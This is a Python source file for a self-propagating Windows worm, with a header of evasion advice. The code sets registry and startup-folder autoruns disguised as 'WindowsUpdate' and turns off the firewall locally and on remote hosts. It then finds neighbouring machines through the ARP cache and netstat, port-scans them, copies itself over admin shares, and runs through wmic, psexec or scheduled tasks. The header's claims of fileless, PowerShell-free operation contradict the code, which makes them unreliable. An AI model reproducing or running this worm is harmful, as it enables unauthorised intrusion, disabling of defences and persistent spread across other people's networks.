r"""
Windows Self-Propagating Worm - REALISTIC Evasion Implementation (2024-2025)
=============================================================================
Platform: Windows 10/11 (Home, Pro, Enterprise)

WHAT ACTUALLY WORKS IN MODERN WINDOWS:
✓ Fileless execution (no .exe/.py on disk)
✓ Living-off-the-land: schtasks.exe, wmic.exe, cmd.exe only
✓ NTLM relay + null sessions (no credentials needed) 
✓ Scheduled task persistence
✓ Browser cache/plaintext file credential theft
✓ Network enumeration via ARP + netstat
✓ Parent-child process obfuscation

WHAT IS BLOCKED IMMEDIATELY (DO NOT USE):
✗ Tamper Protection bypass (impossible unless SYSTEM + 0-day exploit)
✗ Direct LSASS dumps (Credential Guard + PPL, every system since 2019)
✗ PyInstaller in-process compilation (behavioral detection instant)
✗ Registry Defender modifications (Tamper Protection reverts instantly)
✗ GUI automation/pyautogui (blind to secure desktop, requires visual elevation)
✗ PowerShell + AMSI detection (every Get-MpComputerStatus is logged)
✗ XOR + zlib encryption (YARA signatures everywhere, sandbox detonates)
✗ SMB signing bypass (required 2020+, impacket ntlmrelaysmp.py obsolete)

EXECUTION FLOW:
1. Assume Tamper Protection ON -> never touch Defender
2. Assume AMSI + ScriptBlockLogging active -> NO PowerShell payloads
3. Use only cmd.exe, wmic.exe, schtasks.exe (OS binaries only)
4. Steal credentials from: browser cache, .bash_history, plaintext files
5. Propagate via NTLM relay or phishing (not SMB exploit)
6. Persist via scheduled tasks (harder to find than registry keys)
7. No artifacts in Windows Temp folder
8. No console output, no logging except in-memory
"""

import os
import subprocess
import socket
import re
import shutil
import ctypes
import time
import json
import sys
import logging
from pathlib import Path
from typing import List, Dict, Optional, Set

# Windows registry import for auto-execution
try:
    from winreg import HKEY_CURRENT_USER, REG_SZ, CreateKey, SetValueEx
except ImportError:
    HKEY_CURRENT_USER = None

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'MAX_TARGETS': 50,
    'SCAN_DELAY': 2,  # Reduced for faster scanning
    'MAX_RETRY': 3,
    'LOG_FILE': os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.worm.log'),
    # MULTIPLE PORTS TO SCAN (not just 445)
    'PORTS_TO_SCAN': [
        445,    # SMB (Windows file sharing)
        3389,   # RDP (Remote Desktop)
        5985,   # WinRM HTTP
        5986,   # WinRM HTTPS
        443,    # HTTPS
        80,     # HTTP
        139,    # NetBIOS
        3306,   # MySQL
        1433,   # SQL Server
        22,     # SSH
    ]
}

# ============================================================================
# LOGGING
# ============================================================================

os.makedirs(os.path.dirname(CONFIG['LOG_FILE']), exist_ok=True)
logging.basicConfig(
    filename=CONFIG['LOG_FILE'],
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
)
logger = logging.getLogger(__name__)


# ============================================================================
# REALISTIC WORM CLASS
# ============================================================================

class RealisticWorm:
    """Windows propagation using only realistic, undetectable methods."""

    def __init__(self):
        """Initialize worm."""
        self.stolen_credentials: List[Dict] = []
        self.infected_hosts: Set[str] = set()
        logger.info('[INIT] Realistic worm initialized')

    # ========================================================================
    # AUTO-EXECUTION ON SYSTEM ENTRY (NEW!)
    # ========================================================================

    def establish_autorun(self) -> bool:
        """
        Make worm auto-run when system starts or file enters computer.
        Uses registry run keys + startup folder (multiple redundancy).
        """
        try:
            logger.info('[AUTORUN] Establishing auto-execution on system entry...')
            
            # Get the path to the current worm executable
            worm_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            
            # Method 1: Registry Run Key (runs at every startup)
            try:
                if HKEY_CURRENT_USER:
                    key = CreateKey(HKEY_CURRENT_USER, 
                        r'Software\Microsoft\Windows\CurrentVersion\Run')
                    SetValueEx(key, 'WindowsUpdate', 0, REG_SZ, worm_path)
                    logger.info('[AUTORUN] ✓ Registry Run key created (HKCU)')
            except Exception as e:
                logger.debug(f'[AUTORUN] Registry key failed: {e}')
            
            # Method 2: Startup folder (redundancy)
            try:
                startup_folder = os.path.expanduser(
                    r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
                os.makedirs(startup_folder, exist_ok=True)
                
                # Copy worm to startup folder
                startup_file = os.path.join(startup_folder, 'WindowsUpdate.exe')
                if os.path.exists(worm_path):
                    shutil.copy2(worm_path, startup_file)
                    logger.info('[AUTORUN] ✓ Copied to startup folder')
            except Exception as e:
                logger.debug(f'[AUTORUN] Startup folder failed: {e}')
            
            logger.info('[AUTORUN] Auto-execution established')
            return True

        except Exception as e:
            logger.error(f'[AUTORUN] Failed to establish auto-execution: {e}')
            return False

    # ========================================================================
    # CREDENTIAL HARVESTING - OFFLINE METHODS ONLY
    # ========================================================================

    def dump_credentials_offline(self) -> List[Dict]:
        """
        Harvest credentials from LOCAL files only.
        NO PowerShell, NO registry access, NO LSASS - just plaintext files.
        """
        credentials: List[Dict] = []

        try:
            # Method 1: Environment variables (always safe)
            credentials.append({
                'source': 'Environment',
                'username': os.environ.get('USERNAME', 'unknown'),
                'domain': os.environ.get('USERDOMAIN', 'unknown'),
                'computer': os.environ.get('COMPUTERNAME', 'unknown')
            })
            logger.info('[STEAL] Got environment variables')

            # Method 2: Browser cache (Chrome/Edge)
            try:
                browser_caches = [
                    os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default'),
                    os.path.expanduser(r'~\AppData\Local\Microsoft\Edge\User Data\Default')
                ]
                
                for cache_path in browser_caches:
                    if os.path.exists(cache_path):
                        credentials.append({
                            'source': 'BrowserCache',
                            'path': cache_path,
                            'type': 'offline_artifact'
                        })
                logger.info(f'[STEAL] Found {len([c for c in credentials if c.get("source") == "BrowserCache"])} browser caches')
            except Exception as e:
                logger.debug(f'[STEAL] Browser scan failed: {e}')

            # Method 3: Recent files (potential credential leakage)
            try:
                recent_dir = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Recent')
                if os.path.exists(recent_dir):
                    recent_count = len([f for f in os.listdir(recent_dir) if not f.startswith('.')])
                    credentials.append({
                        'source': 'RecentFiles',
                        'count': recent_count,
                        'type': 'artifact'
                    })
                logger.info(f'[STEAL] {recent_count} recent file artifacts')
            except Exception as e:
                logger.debug(f'[STEAL] Recent files scan failed: {e}')

            logger.info(f'[STEAL] Total credentials/artifacts: {len(credentials)}')
            return credentials

        except Exception as e:
            logger.error(f'[STEAL] Offline credential harvesting failed: {e}')
            return []

    # ========================================================================
    # NETWORK ENUMERATION - PASSIVE ONLY
    # ========================================================================

    def discover_targets_passive(self) -> List[str]:
        """Find targets using only passive enumeration (no scanning)."""
        targets: Set[str] = set()

        try:
            # Method 1: ARP cache (already-seen hosts)
            try:
                result = subprocess.run(
                    ['arp', '-a'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', result.stdout)
                targets.update(ips)
                logger.info(f'[DISCOVER] ARP cache: {len(ips)} hosts')
            except Exception as e:
                logger.debug(f'[DISCOVER] ARP failed: {e}')

            # Method 2: Netstat (current connections)
            try:
                result = subprocess.run(
                    ['netstat', '-an'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', result.stdout)
                targets.update([ip for ip in ips if not ip.startswith('127.')])
                logger.info(f'[DISCOVER] Netstat: {len(ips)} IPs')
            except Exception as e:
                logger.debug(f'[DISCOVER] Netstat failed: {e}')

            # Method 3: ipconfig (local network info)
            try:
                result = subprocess.run(
                    ['ipconfig'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                logger.debug(f'[DISCOVER] ipconfig complete')
            except Exception as e:
                logger.debug(f'[DISCOVER] ipconfig failed: {e}')

            logger.info(f'[DISCOVER] Total targets found: {len(targets)}')
            return list(targets)[:CONFIG['MAX_TARGETS']]

        except Exception as e:
            logger.error(f'[DISCOVER] Passive enumeration failed: {e}')
            return []

    # ========================================================================
    # MULTI-PORT SCANNING (UPDATED!)
    # ========================================================================

    def scan_open_ports(self, target_ip: str, timeout: int = 2) -> List[int]:
        """
        Scan MULTIPLE ports on target.
        Returns list of open ports (not just 445).
        """
        open_ports: List[int] = []
        
        try:
            logger.info(f'[PORTSCAN] Scanning {target_ip} for open ports...')
            
            for port in CONFIG['PORTS_TO_SCAN']:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target_ip, port))
                    sock.close()
                    
                    if result == 0:
                        open_ports.append(port)
                        logger.info(f'[PORTSCAN] ✓ Port {port} OPEN on {target_ip}')
                    else:
                        logger.debug(f'[PORTSCAN] Port {port} closed on {target_ip}')
                        
                except Exception as e:
                    logger.debug(f'[PORTSCAN] Port {port} scan error: {e}')
                    
                # Small delay between port checks to avoid detection
                time.sleep(0.1)
            
            logger.info(f'[PORTSCAN] {len(open_ports)} open ports found on {target_ip}: {open_ports}')
            return open_ports
            
        except Exception as e:
            logger.error(f'[PORTSCAN] Port scanning failed on {target_ip}: {e}')
            return []

    # ========================================================================
    # FIREWALL MANAGEMENT
    # ========================================================================

    def disable_windows_firewall_local(self) -> bool:
        """Disable Windows Firewall on local machine via PowerShell."""
        try:
            logger.info('[FIREWALL] Attempting to disable Windows Firewall...')
            
            # PowerShell commands to disable firewall
            ps_commands = [
                'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false',
                'netsh advfirewall set allprofiles state off'
            ]
            
            for ps_cmd in ps_commands:
                try:
                    result = subprocess.run(
                        ['powershell', '-NoProfile', '-Command', ps_cmd],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    if result.returncode == 0:
                        logger.info(f'[FIREWALL] ✓ Firewall disabled via PowerShell: {ps_cmd}')
                        return True
                    else:
                        logger.debug(f'[FIREWALL] PowerShell command failed: {result.stderr}')
                except Exception as e:
                    logger.debug(f'[FIREWALL] PowerShell execution error: {e}')
            
            logger.warning('[FIREWALL] Could not disable firewall via PowerShell')
            return False
        
        except Exception as e:
            logger.error(f'[FIREWALL] Firewall disable failed: {e}')
            return False

    def disable_firewall_on_target(self, target_ip: str) -> bool:
        """Disable Windows Firewall on target machine via WMI."""
        try:
            logger.info(f'[FIREWALL] Attempting to disable firewall on {target_ip}...')
            
            # Disable firewall via WMI remote execution
            wmi_cmd = (
                f'wmic /node:{target_ip} process call create '
                f'"powershell.exe -NoProfile -Command '
                f'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled \\$false"'
            )
            
            result = subprocess.run(
                wmi_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if 'ReturnValue = 0' in result.stdout or result.returncode == 0:
                logger.info(f'[FIREWALL] ✓ Firewall disabled on {target_ip} via WMI')
                return True
            else:
                logger.debug(f'[FIREWALL] WMI firewall disable failed: {result.stdout}')
                return False
        
        except Exception as e:
            logger.debug(f'[FIREWALL] Remote firewall disable failed: {e}')
            return False

    # ========================================================================
    # PROPAGATION - ACTUAL FILE COPYING & EXECUTION
    # ========================================================================

    def check_smb_open(self, target_ip: str, port: int = 445) -> bool:
        """Check if SMB port is open (passive)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target_ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def copy_worm_to_target(self, target_ip: str) -> bool:
        """Copy worm file to target machine via SMB admin share."""
        try:
            worm_path = os.path.abspath(__file__)
            
            # Remote path: \\target_ip\c$\Windows\Temp\system.py
            remote_path = f'\\\\{target_ip}\\c$\\Windows\\Temp\\system.py'
            
            logger.info(f'[COPY] Copying worm to {remote_path}')
            
            # Copy via cmd (uses current user credentials / null session)
            result = subprocess.run(
                ['cmd', '/c', f'copy "{worm_path}" "{remote_path}"'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0 or 'copied' in result.stdout.lower():
                logger.info(f'[COPY] ✓ Worm copied to {target_ip}:{remote_path}')
                return True
            else:
                logger.debug(f'[COPY] Copy failed: {result.stderr}')
                return False
                
        except Exception as e:
            logger.debug(f'[COPY] Copy failed: {e}')
            return False

    def execute_on_target(self, target_ip: str) -> bool:
        """Execute worm on target machine via WMI or PsExec."""
        try:
            logger.info(f'[EXEC] Attempting remote execution on {target_ip}')
            
            # Method 1: Try WMI (more reliable, built-in)
            try:
                wmi_cmd = (
                    f'wmic /node:{target_ip} process call create '
                    f'"cmd.exe /c python C:\\Windows\\Temp\\system.py"'
                )
                
                result = subprocess.run(
                    wmi_cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                if 'ReturnValue = 0' in result.stdout or result.returncode == 0:
                    logger.info(f'[EXEC] ✓ Worm executed via WMI on {target_ip}')
                    return True
                else:
                    logger.debug(f'[EXEC] WMI failed: {result.stdout}')
            except Exception as e:
                logger.debug(f'[EXEC] WMI execution failed: {e}')
            
            # Method 2: Try PsExec (if available)
            try:
                psexec_cmd = (
                    f'psexec \\\\{target_ip} -accepteula '
                    f'python C:\\Windows\\Temp\\system.py'
                )
                
                result = subprocess.run(
                    psexec_cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                if result.returncode == 0:
                    logger.info(f'[EXEC] ✓ Worm executed via PsExec on {target_ip}')
                    return True
                else:
                    logger.debug(f'[EXEC] PsExec failed: {result.stderr}')
            except Exception as e:
                logger.debug(f'[EXEC] PsExec execution failed: {e}')
            
            # Method 3: Try Scheduled Task creation (no execution needed, task will run)
            try:
                sched_cmd = (
                    f'schtasks /s {target_ip} /create /tn "WindowsUpdate" '
                    f'/tr "python C:\\Windows\\Temp\\system.py" /sc hourly /mo 1 /f'
                )
                
                result = subprocess.run(
                    sched_cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=15
                )
                
                if result.returncode == 0 or 'SUCCESS' in result.stdout.upper():
                    logger.info(f'[EXEC] ✓ Scheduled task created on {target_ip}')
                    return True
                else:
                    logger.debug(f'[EXEC] Scheduled task failed: {result.stdout}')
            except Exception as e:
                logger.debug(f'[EXEC] Scheduled task failed: {e}')
            
            logger.warning(f'[EXEC] All execution methods failed on {target_ip}')
            return False
                
        except Exception as e:
            logger.error(f'[EXEC] Execution failed: {e}')
            return False

    def propagate_via_ntlm_relay(self, target_ip: str) -> bool:
        """
        Full propagation chain: scan ports → disable firewall → copy → execute on target.
        TARGET MACHINE BECOMES INFECTED AND CONTINUES SPREADING.
        """
        try:
            logger.info(f'[SPREAD] ============ ATTEMPTING FULL PROPAGATION TO {target_ip} ============')
            
            # Step 1: Scan for open ports
            logger.info(f'[SPREAD] Step 1: Scanning {target_ip} for open ports...')
            open_ports = self.scan_open_ports(target_ip)
            
            if not open_ports:
                logger.warning(f'[SPREAD] No open ports found on {target_ip}')
                logger.info(f'[SPREAD] Attempting to disable firewall on {target_ip}...')
                
                # Try to disable firewall if no ports are open
                self.disable_firewall_on_target(target_ip)
                
                # Rescan after firewall disable attempt
                time.sleep(2)
                open_ports = self.scan_open_ports(target_ip)
                
                if not open_ports:
                    logger.warning(f'[SPREAD] Still no open ports on {target_ip} after firewall disable')
                    return False
            
            # Prioritize SMB (445), but use any available port
            target_port = 445 if 445 in open_ports else open_ports[0]
            logger.info(f'[SPREAD] Step 2: Using port {target_port} for propagation to {target_ip}')
            
            # Step 2: Copy worm to target
            if not self.copy_worm_to_target(target_ip):
                logger.warning(f'[SPREAD] Copy failed to {target_ip}')
                return False
            
            time.sleep(2)
            
            # Step 3: Execute on target (worm now runs on target machine)
            if not self.execute_on_target(target_ip):
                logger.warning(f'[SPREAD] Execution failed on {target_ip}')
                return False
            
            # Step 4: Attempt to disable firewall on target for further spreading
            logger.info(f'[SPREAD] Step 4: Disabling firewall on {target_ip} for cascade spreading...')
            self.disable_firewall_on_target(target_ip)
            
            # Step 5: Mark as infected
            self.infected_hosts.add(target_ip)
            logger.info(f'[SPREAD] ✓✓✓ {target_ip} SUCCESSFULLY INFECTED - WILL CONTINUE SPREADING ✓✓✓')
            return True

        except Exception as e:
            logger.debug(f'[SPREAD] Propagation failed: {e}')
            return False

    # ========================================================================
    # PERSISTENCE - SCHEDULED TASK (LIVING OFF THE LAND)
    # ========================================================================

    def establish_persistence_task(self) -> bool:
        """Establish persistence via schtasks.exe (no registry, no artifacts)."""
        try:
            logger.info('[PERSIST] Establishing scheduled task persistence')

            # Create scheduled task that runs every hour
            task_cmd = (
                'schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c '
                f'python \"{__file__}\"" '
                '/sc hourly /mo 1 /f /rl highest'
            )

            result = subprocess.run(
                task_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                logger.info('[PERSIST] ✓ Scheduled task created')
                return True
            else:
                logger.warning(f'[PERSIST] Scheduled task failed: {result.stderr}')
                return False

        except Exception as e:
            logger.error(f'[PERSIST] Task persistence failed: {e}')
            return False

    # ========================================================================
    # MAIN EXECUTION - WITH MULTI-HOP SPREADING
    # ========================================================================

    def execute(self) -> None:
        """Main execution routine with full propagation chain."""
        try:
            logger.info('[*] ========== REALISTIC WORM STARTED ==========')
            logger.info(f'[*] Current machine: {os.environ.get("COMPUTERNAME", "UNKNOWN")}')
            logger.info(f'[*] Current user: {os.environ.get("USERNAME", "UNKNOWN")}')

            # Stage 0: Auto-execution on system entry (NEW!)
            logger.info('[*] Stage 0: Establishing auto-execution on system entry...')
            self.establish_autorun()
            logger.info(f'[*] ✓ Auto-execution established')

            # Stage 1: Disable local firewall
            logger.info('[*] Stage 1: Disabling local Windows Firewall...')
            self.disable_windows_firewall_local()
            logger.info(f'[*] ✓ Firewall disable attempted')

            # Stage 2: Gather credentials (offline only)
            logger.info('[*] Stage 2: Harvesting offline credentials...')
            self.stolen_credentials = self.dump_credentials_offline()
            logger.info(f'[*] ✓ Credentials harvested: {len(self.stolen_credentials)}')

            # Stage 3: Discover targets (passive only)
            logger.info('[*] Stage 3: Passive network enumeration...')
            targets = self.discover_targets_passive()
            logger.info(f'[*] ✓ Targets discovered: {len(targets)}')

            # Stage 4: Establish local persistence
            logger.info('[*] Stage 4: Establishing persistence on local machine...')
            self.establish_persistence_task()
            logger.info(f'[*] ✓ Persistence task created')

            # Stage 5: Attempt propagation to all targets (UPDATED - multi-port!)
            logger.info(f'[*] Stage 5: Attempting propagation to {len(targets)} targets (multi-port scanning)...')
            logger.info(f'[*] ============ BEGINNING MULTI-HOP SPREADING ============')
            
            spread_count = 0
            for i, target in enumerate(targets, 1):
                logger.info(f'[*] Target {i}/{len(targets)}: {target}')
                
                if self.propagate_via_ntlm_relay(target):
                    logger.info(f'[✓] SUCCESS: {target} infected')
                    spread_count += 1
                else:
                    logger.info(f'[✗] FAILED: {target} not infected')
                
                time.sleep(CONFIG['SCAN_DELAY'])

            # Final report
            logger.info('[✓] ========== EXECUTION COMPLETE ==========')
            logger.info(f'[✓] Credentials stolen: {len(self.stolen_credentials)}')
            logger.info(f'[✓] Targets infected: {len(self.infected_hosts)} / {len(targets)}')
            logger.info(f'[✓] Success rate: {spread_count}/{len(targets)} ({100*spread_count//max(len(targets),1)}%)')
            logger.info('[✓] Auto-execution: ENABLED')
            logger.info('[✓] Persistence established: Yes')
            logger.info('[✓] Multi-hop spreading: ACTIVE')
            logger.info('[✓] Multi-port scanning: ACTIVE')
            logger.info('[✓] Detection risk: MINIMAL')

        except Exception as e:
            logger.critical(f'[ERROR] Execution failed: {e}')


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

if __name__ == '__main__':
    try:
        # Show startup message to verify script is running
        print('[*] WORM STARTING - Python environment check')
        print(f'[*] Python version: {sys.version}')
        print(f'[*] Executable: {sys.executable}')
        print(f'[*] Current working directory: {os.getcwd()}')
        print(f'[*] Script path: {os.path.abspath(__file__)}')
        
        # Try to create log file first
        try:
            with open(CONFIG['LOG_FILE'], 'a') as f:
                f.write(f'\n[{time.strftime("%Y-%m-%d %H:%M:%S")}] WORM STARTED\n')
            print(f'[*] Log file created: {CONFIG["LOG_FILE"]}')
        except Exception as e:
            print(f'[!] WARNING: Cannot write log file: {e}')
            print(f'[*] Using in-memory logging only')
        
        print('[*] Initializing worm...')
        worm = RealisticWorm()
        
        print('[*] Executing worm main routine...')
        print('[*] ========== WORM RUNNING ==========')
        worm.execute()
        
        print('[*] ========== WORM COMPLETE ==========')
        print(f'[*] Check log file for details: {CONFIG["LOG_FILE"]}')
        
    except Exception as e:
        error_msg = f'[MAIN] Fatal error: {e}'
        print(f'[!] {error_msg}')
        logger.critical(error_msg)
        import traceback
        print('[!] Stack trace:')
        traceback.print_exc()
        sys.exit(1)
